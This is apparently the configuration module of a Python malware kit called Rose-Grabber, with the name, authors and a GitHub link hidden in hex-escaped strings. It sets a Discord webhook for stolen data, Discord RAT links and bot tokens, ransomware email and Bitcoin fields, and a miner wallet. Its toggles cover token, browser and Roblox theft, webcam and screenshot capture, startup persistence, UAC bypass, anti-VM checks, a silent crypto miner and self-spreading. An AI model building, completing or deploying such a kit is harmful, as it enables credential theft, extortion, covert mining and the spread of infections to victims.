class Config:
    def __init__(self):
        self.webhook = 'WEBHOOK_URL'

        self.debug_mode = True

        self.rose_discord_rat = False
        self.rose_discord_rat_socket_link = 'ROSE_DISCORD_RAT_SOCKET_LINK'
        
        self.knight_discord_rat = False
        self.knight_discord_rat_bot_token = 'KNIGHT_DISCORD_RAT_BOT_TOKEN'
        self.knight_discord_rat_channel_id = 'KNIGHT_DISCORD_RAT_CHANNEL_ID'
        self.knight_discord_rat_listener_user_id = 'KNIGHT_DISCORD_RAT_LISTENER_USER_ID'
        self.knight_discord_rat_prefix = 'KNIGHT_DISCORD_RAT_PREFIX'

        self.ransomware = False
        self.ransomware_email = 'RANSOMWARE_EMAIL_'
        self.ransomware_btc_adress = 'RANSOMWARE_BTC_ADRESS_'
        self.ransomware_webhook_url = 'RANSOMWARE_WEBHOOKURL'

        self.discord_ping = False
        self.injection = False
        self.token_stealing = False
        self.browser_stealing = False
        self.deviceinf_stealing = False
        self.ipinf_stealing = False
        self.roblox_stealing = False
        self.screenshot = False
        self.start_up = False
        self.use_scr = False
        self.silent_crypto__miner = False
        self.wallet_adress = "_WALLET_ADR_HERE"
        self.fake_error = False
        self.nitro_auto_buy = False
        self.uac_bypass = False
        self.antivm = False
        self.webcam = False
        self.spread_malware = False
        self.spread_malware_msg = "SPRMALWARE_MSFG"

        self.eb_color = int("\x31\x36\x37\x31\x31\x36\x38\x30")
        self.eb_footer = "\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72\x20\x7c\x20\x4d\x61\x64\x65\x20\x62\x79\x20\x67\x75\x6d\x62\x6f\x62\x72\x30\x74\x2c\x20\x49\x43\x45\x78\x46\x53\x2c\x20\x73\x75\x65\x67\x64\x75\x20\x61\x6e\x64\x20\x78\x70\x69\x65\x72\x72\x6f\x7a\x20\x7c\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x44\x61\x6d\x61\x67\x69\x6e\x67\x52\x6f\x73\x65\x2f\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72"
        self.wh_avatar = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x44\x61\x6d\x61\x67\x69\x6e\x67\x52\x6f\x73\x65\x2f\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72\x2f\x6d\x61\x69\x6e\x2f\x63\x6f\x6d\x70\x6f\x6e\x65\x6e\x74\x73\x2f\x72\x65\x61\x64\x6d\x65\x2f\x25\x32\x34\x72\x6f\x73\x65\x2d\x77\x68\x2e\x70\x6e\x67"
        self.wh_name = "\x52\x6f\x73\x65\x2d\x47\x72\x61\x62\x62\x65\x72"

    def get_roblox_stealing(self):
        return self.roblox_stealing

    def get_injection(self):
        return self.injection   

    def get_token_stealing(self):
        return self.token_stealing 

    def get_browser_stealing(self):
        return self.browser_stealing

    def get_deviceinf_stealing(self):
        return self.deviceinf_stealing

    def get_ipinf_stealing(self):
        return self.ipinf_stealing

    def get_webhook(self):
        return self.webhook

    def get_color(self):
        return self.eb_color

    def get_footer(self):
        return self.eb_footer

    def get_debug_mode(self):
        return self.debug_mode

    def get_avatar(self):
        return self.wh_avatar

    def get_name(self):
        return self.wh_name

    def get_rose_discord_rat(self):
        return self.rose_discord_rat

    def get_rose_discord_rat_link(self):
        return self.rose_discord_rat_socket_link
    
    def get_knight_discord_rat(self):
        return self.knight_discord_rat
    
    def get_knight_discord_rat_bot_token(self):
        return self.knight_discord_rat_bot_token
    
    def get_knight_discord_rat_channel_id(self):
        return self.knight_discord_rat_channel_id
    
    def get_knight_discord_rat_listener_user_id(self):
        return self.knight_discord_rat_listener_user_id
    
    def get_knight_discord_rat_prefix(self):
        return self.knight_discord_rat_prefix
    
    def get_discord_ping(self):
        return self.discord_ping

    def get_screenshot(self):
        return self.screenshot
    
    def get_start_up(self):
        return self.start_up
    
    def use_scr(self):
        return self.use_scr
    
    def silent_crypto_miner(self):
        return self.silent_crypto__miner

    def get_wallet_adress(self):
        return self.wallet_adress

    def get_fake_error(self):
        return self.fake_error
    
    def get_nitro_auto_buy(self):
        return self.nitro_auto_buy

    def get_uac_bypass(self):
        return self.uac_bypass

    def get_antivm(self):
        return self.antivm
    
    def get_webcam(self):
        return self.webcam
    
    def get_ransomware_email_adr(self):
        return self.ransomware_email
    
    def get_ransomware_money_adr(self):
        return self.ransomware_btc_adress
    
    def get_ransomware_discord_webhook(self):
        return self.ransomware_webhook_url
    
    def get_ransomware(self):
        return self.ransomware

    def get_spread_malware(self):
        return self.spread_malware
    
    def get_spread_malware_msg(self):
        return self.spread_malware_msg
    
